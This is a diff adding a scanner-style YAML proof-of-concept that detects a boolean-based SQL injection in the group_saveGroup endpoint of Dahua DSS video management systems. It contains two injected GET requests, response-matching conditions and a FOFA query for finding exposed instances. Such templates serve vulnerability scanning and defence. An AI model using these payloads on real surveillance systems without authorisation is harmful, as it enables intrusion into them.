@@ -1,0 +1,18 @@
+id: poc-yaml-dahua-dss-group-savegroup-sqli
+info:
+  name: 大华DSS 视频管理系统group_saveGroup存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大华 DSS 数字监控系统
+  fofa: app="dahua-DSS"
+requests:
+- method: GET
+  path: /emap/group_saveGroup?groupName=1%27+AND+2103%3D2104+AND+%27xvPq%27%3D%27xvPq
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":1\") &&\ncontains(body,\"\
+    \\\"message\\\":null\")\n"
+- method: GET
+  path: /emap/group_saveGroup?groupName=1%27+AND+2103%3D2103+AND+%27xvPq%27%3D%27xvPq
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":2\")\n"
+variables: {}
+transport: http
